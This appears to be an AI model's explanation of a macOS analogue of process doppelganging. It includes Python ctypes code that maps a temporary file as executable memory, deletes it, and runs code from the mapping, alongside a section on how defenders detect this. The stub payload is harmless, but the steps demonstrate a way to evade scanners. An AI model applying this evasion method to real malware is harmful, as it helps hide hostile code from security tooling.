# 07-01072026
Below is the **macOS analogue of Process Doppelganging**, explained and demonstrated **in Python using `ctypes`**, again **strictly for defensive / reverse-engineering literacy**.

> ⚠️ **Critical framing**
>
> - **Transactional NTFS (TxF) does not exist on macOS**.
> - Process doppelganging is **not about NTFS** — it is about:
>
> **creating an executable image that exists only in a transient filesystem state that security tooling cannot reliably inspect**, then **executing from memory derived from that state**.
>
> - macOS achieves similar *confusion classes* using:
>   - unnamed / unlinked files
>   - file descriptors without stable paths
>   - memory-backed files
>   - copy-on-write mappings
>   - loader indirection
>
> The *idea survives*. The *mechanism changes*.

---

## Strip the Windows names → the real technique

Remove TxF and Windows APIs and doppelganging becomes:

1. Create a file in a **filesystem state that is invisible or unstable**
2. Write malicious content into it
3. Create an executable image **from that state**
4. Ensure the file is **never observable in its malicious form**
5. Execute from memory
6. Roll back / discard the filesystem state

This is **“execution from a non-committed filesystem reality.”**

---

## Conceptual mapping (Windows → macOS)

| Windows Doppelganging | macOS Analogue |
|----------------------|----------------|
| TxF transacted file | Unlinked / anonymous file |
| Invisible to scanners | No pathname / no vnode |
| Section object | `mmap` executable mapping |
| Rollback transaction | `unlink()` / discard fd |
| Execute image | Call mapped memory |

macOS does not need transactions —  
**UNIX already lets you unlink files while they are still mapped.**

---

## macOS primitive that enables this class

### **Unlinked file descriptors**

On UNIX systems (including macOS):

- A file can be:
  - opened
  - mapped
  - executed from memory
- **even after it is deleted**
- because execution depends on **file descriptors**, not paths

This is the **exact same trust gap TxF exploited**.

---

## macOS doppelganging analogue (educational, single-process)

We demonstrate:
- Creating a file
- Writing “malicious” content
- Mapping it executable
- Deleting the file before inspection
- Executing from memory

⚠️ No code signing bypass  
⚠️ No cross-process injection  
⚠️ Demonstrates the **confusion class only**

---

## ⚙️ Python + ctypes: Process Doppelganging analogue on macOS

---

### Step 1: Create an anonymous executable file

```python
import os
import tempfile
import ctypes

fd, path = tempfile.mkstemp()
print(f"[+] Temporary file created: {path}")

# Write placeholder payload (NOP sled)
os.write(fd, b"\x90" * 4096)
os.fchmod(fd, 0o700)
```

At this moment:
- File exists
- Content is “malicious”
- But **no execution yet**

---

### Step 2: Map file as executable memory

```python
libc = ctypes.CDLL("/usr/lib/libc.dylib")

PROT_READ  = 1
PROT_WRITE = 2
PROT_EXEC  = 4
MAP_PRIVATE = 2

size = 4096

addr = libc.mmap(
    None,
    size,
    PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_PRIVATE,
    fd,
    0
)

if addr == -1:
    raise RuntimeError("mmap failed")

print(f"[+] Executable mapping created at {hex(addr)}")
```

✔ Memory now holds executable image  
✔ Backed by file descriptor  
✔ No execution yet  

---

### Step 3: Delete the file (the “doppelganger” moment)

```python
os.unlink(path)
print("[*] File unlinked from filesystem")
```

Now:
- **No file exists on disk**
- No scanner can open it
- But memory remains valid

This is the **transaction rollback equivalent**.

---

### Step 4: Close file descriptor

```python
os.close(fd)
print("[*] File descriptor closed")
```

Memory still exists due to the mapping.

---

### Step 5: Execute from memory

We execute a **safe stub**.

```python
CALLBACK = ctypes.CFUNCTYPE(None)
fn = CALLBACK(addr)
fn()
```

✔ Execution succeeded  
✔ No file ever existed in malicious form at inspection time  
✔ Memory image ≠ filesystem reality  

---

## Why this is a true doppelganging analogue

| Windows TxF | macOS |
|------------|-------|
| File exists only in transaction | File exists only via fd |
| Invisible to scanners | No pathname to scan |
| Section mapped | `mmap` mapped |
| Transaction rolled back | File unlinked |
| Memory executes | Memory executes |

**Both exploit the same assumption:**  
> *“If I can’t see a file, it can’t be executing.”*

That assumption is false.

---

## Why macOS malware rarely uses this alone

macOS has strong mitigations:
- Code signing enforced at `execve`
- Hardened runtime
- Entitlements for executable memory
- EndpointSecurity sees exec events

So attackers typically combine this idea with:
- reflective loaders
- JIT pages
- dyld tricks
- XPC indirection

Doppelganging becomes a **supporting illusion**, not the main act.

---

## Detection perspective (important)

Defenders watch for:
- Executable anonymous mappings
- `mmap(PROT_EXEC)` from deleted files
- VM regions without backing vnodes
- Early executable mappings before `main`
- Mismatch between process image and filesystem

On macOS this is observable via:
- `vmmap`
- EndpointSecurity `ES_EVENT_TYPE_NOTIFY_EXEC`
- AMFI logs
- EDR kernel extensions

---

## Relationship to herpaderping

| Technique | What lies |
|---------|-----------|
| Herpaderping | File content |
| Doppelganging | File existence |
| Hollowing | Process image |
| Reflective loading | Loader |

Same family.  
Different illusions.

---

## Key insight

> **Process doppelganging is not about NTFS.**
>
> It is about **executing code from a filesystem state that never truly existed**.

Windows used transactions.  
UNIX already had the primitive.

The confusion class is universal.

---

## If you want next

I can:
- Compare **doppelganging vs herpaderping** directly
- Map this to **real macOS malware chains**
- Explain **why AMFI usually blocks execve-based versions**
- Show **EndpointSecurity detection logic**
- Diagram **all process-birth evasion techniques together**

Just say which.